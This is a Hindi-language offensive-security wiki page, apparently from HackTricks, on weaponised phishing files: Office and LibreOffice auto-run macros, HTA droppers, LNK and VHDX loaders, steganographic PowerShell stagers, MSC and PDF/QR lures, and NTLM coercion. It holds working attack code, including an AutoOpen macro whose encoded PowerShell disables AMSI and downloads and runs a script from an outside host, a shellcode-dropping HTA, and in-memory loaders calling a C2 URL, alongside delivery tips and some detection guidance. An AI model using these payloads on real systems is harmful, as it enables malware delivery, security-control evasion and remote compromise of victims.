# फ़िशिंग फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले उसके डेटा का सत्यापन करता है। यह सत्यापन OfficeOpenXML मानक के अनुसार डेटा संरचना की पहचान करके किया जाता है। डेटा संरचना की पहचान के दौरान कोई त्रुटि होने पर, विश्लेषण की जा रही फ़ाइल नहीं खुलेगी।

आमतौर पर, macros वाली Word फ़ाइलों में `.docm` एक्सटेंशन होता है। हालांकि, फ़ाइल का एक्सटेंशन बदलकर उसका नाम बदलना और फिर भी macros को निष्पादित करने की क्षमता बनाए रखना संभव है।\
उदाहरण के लिए, डिज़ाइन के अनुसार RTF फ़ाइल macros का समर्थन नहीं करती, लेकिन DOCM फ़ाइल का नाम बदलकर RTF करने पर Microsoft Word उसे संभाल लेगा और उसमें macro निष्पादन संभव होगा।\
यही आंतरिक कार्यप्रणाली और तंत्र Microsoft Office Suite के सभी सॉफ़्टवेयर (Excel, PowerPoint आदि) पर लागू होते हैं।

कुछ Office प्रोग्राम किन एक्सटेंशन वाली फ़ाइलों को निष्पादित करेंगे, यह जाँचने के लिए आप निम्न कमांड का उपयोग कर सकते हैं:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX फाइलें जो किसी remote template (File –Options –Add-ins –Manage: Templates –Go) को reference करती हैं और जिसमें macros शामिल हैं, वे भी macros “execute” कर सकती हैं।

### External Image Load

यहाँ जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, और **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: यहाँ जाएँ: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

प्राप्त document का विश्लेषण करने के लिए, उसे बनाने के बजाय, देखें [VBA macro analysis: junk code and UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Macros Backdoor

Document से मनमाना code चलाने के लिए macros का उपयोग करना संभव है।

#### Autoload functions

जितने अधिक सामान्य ये होते हैं, AV द्वारा उनका पता लगाए जाने की संभावना उतनी ही अधिक होती है।

- AutoOpen()
- Document_Open()

#### Macros Code Examples

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### मेटाडेटा मैन्युअल रूप से हटाएँ

**File > Info > Inspect Document > Inspect Document** पर जाएँ। इससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें, फिर **Document Properties and Personal Information** के आगे **Remove All** पर क्लिक करें।

#### Doc Extension

काम पूरा होने पर, **Save as type** ड्रॉपडाउन चुनें और फ़ॉर्मैट को **`.docx`** से बदलकर Word 97-2003 **`.doc`** करें।\
ऐसा इसलिए करें क्योंकि आप **`.docx`** फ़ाइल में macros सेव नहीं कर सकते, और macro-enabled **`.docm`** extension के साथ एक **बदनामी** जुड़ी है (जैसे, thumbnail icon पर बड़ा `!` होता है और कुछ web/email gateway इन्हें पूरी तरह block कर देते हैं)। इसलिए, यह **legacy `.doc` extension सबसे अच्छा समझौता है**।

#### Malicious Macros Generators

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT ऑटो-रन macros (Basic)

LibreOffice Writer documents में Basic macros एम्बेड किए जा सकते हैं और macro को **Open Document** event से बाँधकर फ़ाइल खुलने पर उन्हें अपने-आप चलाया जा सकता है (Tools → Customize → Events → Open Document → Macro…)।<sup>[[1]](#references)</sup> एक साधारण reverse shell macro ऐसा दिखता है:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

ध्यान दें कि string के अंदर doubled quotes (`""`) हैं – LibreOffice Basic literal quotes को escape करने के लिए इनका उपयोग करता है, इसलिए `...==""")` पर समाप्त होने वाले payloads में inner command और Shell argument, दोनों के quotes संतुलित रहते हैं।

डिलीवरी के सुझाव:

- फ़ाइल को `.odt` के रूप में सेव करें और macro को document event से bind करें, ताकि document खुलते ही यह तुरंत चले।
- `swaks` से ईमेल भेजते समय `--attach @resume.odt` का उपयोग करें (`@` ज़रूरी है, ताकि attachment के रूप में filename string नहीं, बल्कि फ़ाइल के bytes भेजे जाएँ)। उन SMTP servers का दुरुपयोग करते समय यह महत्वपूर्ण है जो बिना validation के मनमाने `RCPT TO` recipients स्वीकार करते हैं।

## HTA Files

HTA एक Windows program है जो **HTML और scripting languages (जैसे VBScript और JScript) को जोड़ता है**। यह user interface बनाता है और browser के security model की पाबंदियों के बिना, एक "पूरी तरह trusted" application के रूप में चलता है।

HTA को **`mshta.exe`** का उपयोग करके चलाया जाता है। यह आम तौर पर **Internet Explorer** के साथ **install** होता है, जिससे **`mshta`, IE पर निर्भर होता है**। इसलिए, यदि इसे uninstall कर दिया गया है, तो HTA execute नहीं हो पाएँगे।

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTML ईमेल में नकली अटैचमेंट कार्ड

HTML ईमेल में असली अटैचमेंट भेजने के बजाय, किसी प्रदाता के मूल attachment-preview कार्ड की नकल की जा सकती है। Talos ने चार Base64-encoded inline PNG MIME parts से दोबारा बनाया गया Gmail कार्ड देखा। पूरा दृश्य कार्ड एक anchor के भीतर था, और `?m=<target-id>` में recipient value से हर recipient की अलग-अलग tracking संभव हुई। लिंक `http://` या `https://` के बजाय `//` से शुरू होता था; ब्राउज़र इस protocol-relative रूप को resolve कर लेते हैं, लेकिन केवल पूरी तरह qualified URLs से मेल खाने वाले URL extractors इसे नहीं पकड़ पाते।<sup>[[11]](#references)</sup>

विश्लेषण के दौरान, rendered attachment list पर भरोसा करने के बजाय raw MIME की जाँच करें। देखें कि inline image parts मिलकर दृश्य कार्ड कैसे बनाते हैं, उसे घेरने वाले anchor की पहचान करें, और URL निकालने से पहले protocol-relative `href` मानों को normalize करें।<sup>[[11]](#references)</sup>

Envelope/header sender spoofing और DMARC alignment परीक्षण के लिए, देखें [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)।

## NTLM Authentication को बाध्य करना

**"Remotely" NTLM authentication को बाध्य करने** के कई तरीके हैं। उदाहरण के लिए, आप ईमेल या उस HTML में **invisible images** जोड़ सकते हैं जिसे उपयोगकर्ता खोलेगा (HTTP MitM भी?)। या पीड़ित को **ऐसी फ़ाइलों के पते** भेज सकते हैं जो **फ़ोल्डर खोलते ही** authentication **ट्रिगर** करें।

**इन और अन्य विचारों को निम्नलिखित पेजों पर देखें:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चुरा ही नहीं सकते, बल्कि **NTLM relay attacks भी कर सकते हैं**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## `ftp.exe` के ज़रिए LNK local-command staging

एक shortcut `ftp.exe -s:icon.ico` शुरू कर सकता है, जहाँ text command file को image extension के पीछे छिपाया जाता है।<sup>[[12]](#references)</sup> `-s:` विकल्प local FTP commands पढ़ता है; Windows 8 और उसके बाद के संस्करणों में, वह फ़ाइल UTF-8 encoded होनी चाहिए।<sup>[[13]](#references)</sup> `!` से शुरू होने वाली पंक्ति `cmd /c` के ज़रिए local command चलाती है, और उस command को FTP server पर नहीं भेजती। इस local execution path के लिए FTP connection ज़रूरी नहीं है।<sup>[[14]](#references)</sup> रिपोर्ट की गई chain में, FTP script दूसरी command file तक पहुँची। पूरी `!` पंक्ति मायने रखती है: `!more res.ico` अकेले फ़ाइल दिखाता है, जबकि `cmd` तक pipe करने से उसकी सामग्री execute होती है।<sup>[[12]](#references)[[14]](#references)</sup>

इसी chain में हर update के लिए नया executable install करने के बजाय, एक recurring task से writable command file को फिर से पढ़वाया गया। Task action था `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; फ़ाइल में ऐसी command थी जो चलाए जाने पर instructions fetch करती थी। एक संबंधित variant में, scheduled run से पहले replacement command file डाउनलोड की गई। Task चलने के समय फ़ाइल मौजूद और readable होनी चाहिए; `conhost` task को उसके configured user token से अधिक privileges नहीं देता।<sup>[[12]](#references)</sup> Task mechanics के लिए [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md) देखें।

## छिपे हुए MSI और decoy document वाला VHDX shortcut

Mounted VHDX में दिखाई देने वाला LNK दिखाया जा सकता है, जबकि उसी volume में MSI और decoy spreadsheet छिपे रहते हैं। रिपोर्ट की गई chain में, LNK ने `cmd.exe /c Visa_Details.msi & Attachment-2.xls` का उपयोग किया। `&` separator installer command विफल होने पर भी decoy खोल देता है; document का खुलना सफल installation का प्रमाण नहीं है। यह [MSI custom-action execution](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md) का delivery variant है, अपने आप में MSI privilege escalation नहीं।<sup>[[12]](#references)</sup>

इस MSI के लिए, `CustomAction.Type` **194**, `Binary` table (**2**) में संग्रहित EXE को ignore-return-code (**64**) और asynchronous (**128**) flags के साथ जोड़ता है। **64 + 128** के संयोजन का अर्थ है कि Windows Installer EXE के पूरा होने की प्रतीक्षा नहीं करता; केवल 128 flag होने पर वह sequence के अंत में प्रतीक्षा करता।<sup>[[15]](#references)[[16]](#references)</sup> Embedded EXE को execution का श्रेय देने से पहले, action के `Source` को `Binary` table और `InstallExecuteSequence` में उसकी स्थिति से मिलाकर जाँचें।<sup>[[12]](#references)[[15]](#references)</sup> [WebDAV UNC path से remote MSI डिलीवर किया जा सकता है](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), लेकिन वह एक अलग entry point है।

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बहुत प्रभावी campaigns ऐसी ZIP डिलीवर करती हैं जिसमें दो वैध decoy documents (PDF/DOCX) और एक malicious .lnk होती है। तरकीब यह है कि असली PowerShell loader ZIP के raw bytes में एक unique marker के बाद संग्रहित होता है, और .lnk उसे carve करके पूरी तरह memory में चलाती है।<sup>[[2]](#references)</sup>

आम तौर पर, .lnk द्वारा लागू PowerShell one-liner का flow:

1) सामान्य paths में मूल ZIP ढूँढ़ें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory का parent।
2) ZIP bytes पढ़ें और hardcoded marker (जैसे, xFIQCV) ढूँढ़ें। Marker के बाद की हर चीज़ embedded PowerShell payload होती है।
3) ZIP को %ProgramData% में copy करें, वहीं extract करें, और वैध दिखने के लिए decoy .docx खोलें।
4) मौजूदा process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगला stage deobfuscate करें (जैसे, सभी # characters हटाएँ) और उसे memory में execute करें।

Embedded stage को carve करके चलाने के लिए PowerShell का उदाहरण skeleton:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

नोट्स
- Delivery में अक्सर प्रतिष्ठित PaaS subdomains (जैसे, *.herokuapp.com) का दुरुपयोग होता है और payloads को gate किया जा सकता है (IP/UA के आधार पर benign ZIPs serve करना)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts कम करने के लिए उसे Reflection.Emit + VirtualAlloc के ज़रिए execute करता है।

इसी chain में इस्तेमाल किया गया Persistence
- Microsoft Web Browser control का COM TypeLib hijacking, ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को अपने-आप फिर से launch करे।<sup>[[2]](#references)[[4]](#references)</sup> विवरण और सीधे इस्तेमाल किए जा सकने वाले commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसी ZIP files जिनमें archive data के अंत में ASCII marker string (जैसे, xFIQCV) जोड़ी गई हो।
- ऐसी .lnk जो ZIP ढूँढ़ने के लिए parent/user folders की सूची बनाती है और एक decoy document खोलती है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के ज़रिए AMSI tampering।
- लंबे समय तक चलने वाले business threads, जिनके अंत में trusted PaaS domains पर hosted links हों।

## LNK में पहले decoy दिखाने की staging → scheduled-task persistence → trusted CPL side-loading

एक और बार-बार दिखने वाला pattern है **document का रूप धारण करने वाली `.lnk`**, जो background में असली chain को stage करते हुए तुरंत एक benign lure खोलती है।<sup>[[3]](#references)</sup>

देखा गया workflow:
1. Shortcut **PDF का रूप धारण करता है** और obfuscated PowerShell downloader को spawn करने के लिए `conhost.exe` या इसी तरह के किसी proxy का इस्तेमाल करता है।
2. PowerShell स्पष्ट tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) को तोड़ता है, ताकि `iwr`, `gci`, `ren`, `cpi` या `schtasks` खोजने वाले साधारण detections command को पकड़ न पाएँ।
3. Stager पहले **decoy document download** करता है, उसे victim के लिए खोलता है, और फिर background में malicious files को दोबारा बनाता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और बाद में filler characters हटाकर उनका नाम बदला जा सकता है, जिससे स्पष्ट `.exe` / `.cpl` artifacts दिखने में देरी होती है।
5. Persistence एक **minute-based scheduled task** से स्थापित होता है, जो user-writable path से trusted host binary launch करता है।

इस pattern से जुड़े न्यूनतम hunting clues:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

पहचानने योग्य एक उपयोगी staging layout:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा चरण stealthy क्यों है

Rapid7 केस स्टडी में, scheduled task ने **`Fondue.exe`** को `C:\Users\Public\` से बार-बार लॉन्च किया। चूंकि **`APPWIZ.cpl`** को इसके साथ ही रखा गया था और वह **`RunFODW`** export करता था, इसलिए trusted Microsoft binary ने वैध system copy के बजाय attacker CPL को side-load किया।

CPL फिर:
- `C:\Windows\Tasks\editor.dat` से **AES-256-CBC** blob पढ़ता है
- **Windows CNG / `bcrypt.dll`** के ज़रिए उसे decrypt करता है
- executable memory allocate करके उसमें decrypted shellcode copy करता है
- **`EnumUILanguagesW`** के callback के रूप में shellcode pointer देकर उसे अप्रत्यक्ष रूप से execute करता है

आखिरी चरण की अलग से hunting करना उपयोगी है: malware अक्सर सीधे `((void(*)())buf)()` jump से बचता है और इसके बजाय execution को आगे बढ़ाने के लिए **वैध callback लेने वाले WinAPI** का दुरुपयोग करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने फिर final PE को पूरी तरह memory में map किया और execution सौंपने से पहले current process में **AMSI/WLDP/ETW** को patch किया। Side-loading और memory-resident post-processing पर अधिक जानकारी के लिए देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

व्यावहारिक hunting pivots:
- `.lnk` से `powershell.exe` या `conhost.exe` spawn होना, जिसके बाद एक दिखाई देने वाला decoy document खुले।
- **`C:\Users\Public\`** में छोटे समय के लिए downloads होना और फिर nonsense extensions से तुरंत rename होना।
- `GoogleErrorReport` जैसे साधारण नामों वाले scheduled tasks का **user-writable directories** से execute होना।
- Trusted binaries का उसी non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** में Base64 text blobs लिखे जाना और फिर side-loaded module द्वारा पढ़ा जाना।

## इमेज में Steganography-delimited payloads (PowerShell stager)

हालिया loader chains एक obfuscated JavaScript/VBS देते हैं, जो Base64 PowerShell stager को decode करके चलाता है। यह stager एक इमेज (अक्सर GIF) download करता है, जिसमें Base64-encoded .NET DLL को plain text के रूप में विशिष्ट start/end markers के बीच छिपाया गया होता है। Script इन delimiters को खोजती है (जंगली परिवेश में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), बीच का text निकालती है, उसे bytes में Base64-decode करती है, assembly को memory में load करती है और C2 URL के साथ एक ज्ञात entry method invoke करती है।<sup>[[5]](#references)</sup>

कार्यप्रवाह
- चरण 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → `-nop -w hidden -ep bypass` के साथ PowerShell stager लॉन्च करता है।
- चरण 2: PowerShell stager → इमेज download करता है, marker-delimited Base64 निकालता है, .NET DLL को memory में load करता है और C2 URL व options देकर उसका method (जैसे VAI) call करता है।
- चरण 3: Loader final payload प्राप्त करता है और आमतौर पर process hollowing के ज़रिए उसे किसी trusted binary (आमतौर पर MSBuild.exe) में inject करता है।<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing और trusted utility proxy execution के बारे में यहां और देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

किसी इमेज से DLL निकालने और memory में .NET method invoke करने का PowerShell उदाहरण:

<details>
<summary>PowerShell stego payload extractor और loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है।<sup>[[6]](#references)</sup> Markers अलग-अलग campaigns में अलग होते हैं।
- Assembly लोड करने से पहले आमतौर पर AMSI/ETW bypass और string deobfuscation लागू किए जाते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए scan करें; उन PowerShell प्रक्रियाओं की पहचान करें जो images को access करती हैं और तुरंत Base64 blobs को decode करती हैं।

Stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखने वाला initial stage एक छोटा, भारी obfuscation वाला `.js` या `.vbs` होता है, जिसे archive के अंदर भेजा जाता है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और HTTPS पर अगला stage शुरू करने के लिए `-nop -w hidden -ep bypass` के साथ PowerShell लॉन्च करना है।<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- अपनी फ़ाइल की सामग्री पढ़ें
- junk strings के बीच Base64 blob ढूँढ़ें
- ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` द्वारा `powershell.exe` चलाकर execute करें

Hunting के संकेत
- Archived JS/VBS attachments, command line में `-enc`/`FromBase64String` के साथ `powershell.exe` शुरू करते हैं।
- `wscript.exe`, user temp paths से `powershell.exe -nop -w hidden` लॉन्च करता है।

## MSC documents as execution containers (GrimResource)

Microsoft Management Console फ़ाइलें (`.msc`) XML console definitions होती हैं, जिन्हें सामान्यतः `mmc.exe` खोलता है। **GrimResource**, पुराने XSS primitive वाले `apds.dll` resource के `StringTable` reference का दुरुपयोग करता है, जिससे crafted console खोलने पर JavaScript `mmc.exe` के भीतर चलने लगता है। देखे गए samples में `transformNode`-आधारित obfuscation को **DotNetToJScript** के साथ मिलाया गया था, ताकि सामान्य Office-macro path के बिना .NET payload instantiate किया जा सके।<sup>[[9]](#references)</sup>

Static triage के लिए, untrusted MSC को text की तरह देखें और उस पर double-click **न करें**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivots में `mmc.exe` द्वारा CLR या script components लोड करना, network connections बनाना, या `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` अथवा किसी अनपेक्षित executable को spawn करना शामिल है। यह format वैध है, इसलिए हर MSC को block करने के बजाय detections को **origin + suspicious XML/script content + `mmc.exe` behavior** के आधार पर correlate करना चाहिए।<sup>[[9]](#references)</sup>

## PDF/QR redirectors और payload gating

किसी PDF के उपयोगी होने के लिए उसमें exploit होना ज़रूरी नहीं है। हाल के campaigns में benign दिखने वाले document में **QR code या सामान्य link** रखा जाता है, browser session को mail controls से बाहर ले जाया जाता है, और recipient address के अनुसार destination को personalize किया जाता है। Microsoft ने 2025 के ऐसे PDFs का दस्तावेज़ीकरण किया जिनमें QR URLs हर recipient के लिए अलग थे और RaccoonO365 credential-harvesting infrastructure तक ले जाते थे; एक समानांतर chain में IP/environment gating का उपयोग करके चुने हुए visitors को JavaScript/MSI path दिया गया, जबकि scanners या disallowed clients को benign PDF दिया गया।<sup>[[10]](#references)</sup>

PDF actions और rendered QR codes—दोनों की triage करें। QR को extractable image के रूप में store करने के बजाय vector-drawn किया जा सकता है, इसलिए embedded images extract करने के साथ-साथ हर page को rasterize भी करें:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

किसी isolated analysis system से authentication किए बिना decoded destinations और redirects की जाँच करें। उपयोगी hunting features में लगभग खाली mail bodies वाले केवल-QR PDFs, query parameter में embedded recipient email, प्रतिष्ठित hosting सेवाओं से होकर जाने वाले कई redirects, और IP, geolocation, cookies, referrer या user agent के अनुसार लौटाई जाने वाली अलग-अलग सामग्री शामिल हैं। नियंत्रित profiles के साथ requests की तुलना करें, क्योंकि एक sandbox fetch को केवल decoy मिल सकता है।<sup>[[10]](#references)</sup>

## NTLM hashes चुराने के लिए Windows files

**NTLM creds चुराने की जगहें** वाला पेज देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: अमेरिकी कंपनियों को निशाना बनाने वाला एक परिष्कृत Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-themed Loader Chain के ज़रिए Dropping Elephant Tradecraft को ट्रैक करना](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader कई प्रकार के Infostealers पहुँचाता है](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: initial access और evasion के लिए Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors tax season का लाभ उठाकर tax-themed phishing campaigns तैनात करते हैं](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587 delivery chain और Antino backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER ने PapRAT के साथ अपना Arsenal बढ़ाया](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - ftp command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Custom Action Type 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Custom Action Return Processing Options](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
